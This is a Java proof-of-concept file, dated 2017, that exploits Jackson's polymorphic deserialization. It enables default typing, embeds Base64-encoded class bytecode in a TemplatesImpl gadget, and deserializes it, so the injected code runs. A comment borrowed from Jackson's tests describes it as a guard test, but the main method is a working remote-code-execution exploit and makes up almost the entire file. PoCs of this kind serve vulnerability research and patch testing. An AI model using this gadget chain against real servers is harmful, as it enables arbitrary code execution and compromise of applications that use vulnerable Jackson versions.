package jackson;

/**
 * Created by liaoxinxi on 2017-6-15.
 */

import java.io.ByteArrayOutputStream;
import com.fasterxml.jackson.core.JsonParser;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

import com.fasterxml.jackson.databind.*;

import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;


//import com.fasterxml.jackson.databind.exc.InvalidDefinitionException;

/**
 * Test case(s) to guard against handling of types that are illegal to handle
 * due to security constraints.
 */

public class Poc {
    static class Bean1599 {
        public int id;
        public Object obj;
    }
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }
    public static String aposToQuotes(String json) {
        return json.replace("'", "\"");
    }

    public static void main(String args[]) throws Exception
    {
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String evilCode = readClass(System.getProperty("user.dir")+"/target/classes/jackson/Test.class");
        final String JSON = aposToQuotes(
                        "{\n"
                        + "'id':123,\n"
                        + " 'obj':[ '" + NASTY_CLASS + "',\n"
                        + "  {\n"
                        + "    'transletBytecodes' : ['" + evilCode + "'],\n"
                        + "    'transletName':'xiang',\n"
                        + "    'outputProperties':{ }\n"
                        + "  }\n"
                        + " ]\n"
                        +"}"
        );
        System.out.println(JSON);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        {
            mapper.readValue(JSON, Bean1599.class);
            System.out.println("Should not pass");
        }
    }
}

